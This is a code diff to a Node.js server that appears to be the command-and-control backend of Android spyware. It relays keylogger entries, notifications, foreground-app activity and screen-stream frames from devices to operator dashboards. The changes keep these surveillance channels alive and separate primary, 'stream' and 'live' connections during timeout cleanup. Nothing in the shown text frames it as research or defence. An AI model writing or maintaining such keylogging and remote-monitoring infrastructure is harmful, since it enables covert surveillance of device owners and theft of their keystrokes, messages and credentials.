@@ -268,7 +268,8 @@ async function processMessage(clientId, clientType, event, data) {
             } else {
                 dev.isOnline  = true;
                 dev.lastSeen  = new Date();
-                dev.deviceInfo = { ...dev.deviceInfo, ...info };
+                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
+                dev.markModified('deviceInfo');
             }
             await dev.save();
         } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
@@ -324,6 +325,7 @@ async function processMessage(clientId, clientType, event, data) {
     // ── Keylog push from Android → relay to dashboards ──────────────
     if (event === 'keylog:entry') {
         const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now(); // keep live channel alive
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
             broadcastDash('keylog:push', { ...data, deviceId });
@@ -334,6 +336,7 @@ async function processMessage(clientId, clientType, event, data) {
     // ── Notification push from Android → relay to dashboards ─────────
     if (event === 'notification:entry') {
         const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now(); // keep live channel alive
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
             const entry = { ...data, deviceId };
@@ -351,6 +354,7 @@ async function processMessage(clientId, clientType, event, data) {
     // ── Recent app activity from Android → relay to dashboards ───────
     if (event === 'app:foreground') {
         const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now(); // keep live channel alive
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
             const entry = { ...data, deviceId };
@@ -370,6 +374,7 @@ async function processMessage(clientId, clientType, event, data) {
     // ── Stream frame from Android ────────────────────────────────────
     if (event === 'stream:frame') {
         const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now(); // keep stream channel alive
         const deviceId = conn?.deviceId;
         if (!deviceId) return;
         const frameData = data?.frameData;
@@ -786,19 +791,29 @@ setInterval(() => {
     }
 }, PING_INTERVAL);
 
-// Drop stale TCP connections
+// Drop stale TCP connections — handle primary and secondary channels separately
 setInterval(async () => {
     const now = Date.now();
     for (const [id, conn] of tcpClients) {
         if (!conn.deviceId) continue;
         if (now - conn.lastPong > PONG_TIMEOUT) {
-            log('TCP', `Device ${conn.deviceId} timed out, dropping`);
+            log('TCP', `Device ${conn.deviceId} timed out, dropping (channel: ${conn.channelType || 'primary'})`);
             tcpClients.delete(id);
-            deviceToTcp.delete(conn.deviceId);
             conn.destroy();
-            try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
-            broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
-            broadcastDeviceList();
+
+            if (conn.channelType === 'stream') {
+                // Secondary stream channel timed out — clean up stream ref only
+                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
+            } else if (conn.channelType === 'live') {
+                // Secondary live channel timed out — clean up live ref only
+                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
+            } else {
+                // Primary channel timed out — device is truly offline
+                deviceToTcp.delete(conn.deviceId);
+                try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
+                broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
+                broadcastDeviceList();
+            }
         }
     }
 }, 10000);
